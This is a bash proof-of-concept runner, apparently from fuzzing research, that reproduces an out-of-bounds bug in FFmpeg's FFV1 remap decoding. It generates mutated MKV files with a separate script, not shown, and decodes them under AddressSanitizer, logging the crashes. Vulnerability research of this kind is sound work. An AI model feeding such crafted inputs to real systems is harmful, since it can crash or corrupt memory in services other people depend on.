#!/bin/bash
# PoC runner for VULN 001: FFV1 decode_remap OOB via 32-bit float remap
set -uo pipefail

cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT=vuln_001_result.txt

echo "[*] Step 1: Generate mutated input files..." | tee "$RESULT"
python3 vuln_001_gen.py 2>&1 | tee -a "$RESULT"

echo "" | tee -a "$RESULT"
echo "[*] Step 2: Decode primary (0xFF fill) input..." | tee -a "$RESULT"
if [ -f vuln_001_input.mkv ]; then
    ASAN_OPTIONS="abort_on_error=0:log_path=./asan_v001_primary" \
      "$BIN" -i vuln_001_input.mkv -f null - >> "$RESULT" 2>&1 || true
    for f in asan_v001_primary.*; do
        [ -f "$f" ] && { echo "=== ASAN: $f ===" >> "$RESULT"; cat "$f" >> "$RESULT"; }
    done
else
    echo "[!] vuln_001_input.mkv not found" | tee -a "$RESULT"
fi

echo "" | tee -a "$RESULT"
echo "[*] Step 3: Decode alt (alternating) input..." | tee -a "$RESULT"
if [ -f vuln_001_input_alt.mkv ]; then
    ASAN_OPTIONS="abort_on_error=0:log_path=./asan_v001_alt" \
      "$BIN" -i vuln_001_input_alt.mkv -f null - >> "$RESULT" 2>&1 || true
    for f in asan_v001_alt.*; do
        [ -f "$f" ] && { echo "=== ASAN: $f ===" >> "$RESULT"; cat "$f" >> "$RESULT"; }
    done
fi

echo "" | tee -a "$RESULT"
echo "[*] Step 4: Decode partial (remap section only) input..." | tee -a "$RESULT"
if [ -f vuln_001_input_partial.mkv ]; then
    ASAN_OPTIONS="abort_on_error=0:log_path=./asan_v001_partial" \
      "$BIN" -i vuln_001_input_partial.mkv -f null - >> "$RESULT" 2>&1 || true
    for f in asan_v001_partial.*; do
        [ -f "$f" ] && { echo "=== ASAN: $f ===" >> "$RESULT"; cat "$f" >> "$RESULT"; }
    done
fi

echo "" | tee -a "$RESULT"
echo "[*] Step 5: Decode reference (valid) file..." | tee -a "$RESULT"
if [ -f vuln_001_ref.mkv ]; then
    "$BIN" -i vuln_001_ref.mkv -f null - >> "$RESULT" 2>&1 || true
fi

echo "" | tee -a "$RESULT"
echo "=== Done ===" | tee -a "$RESULT"
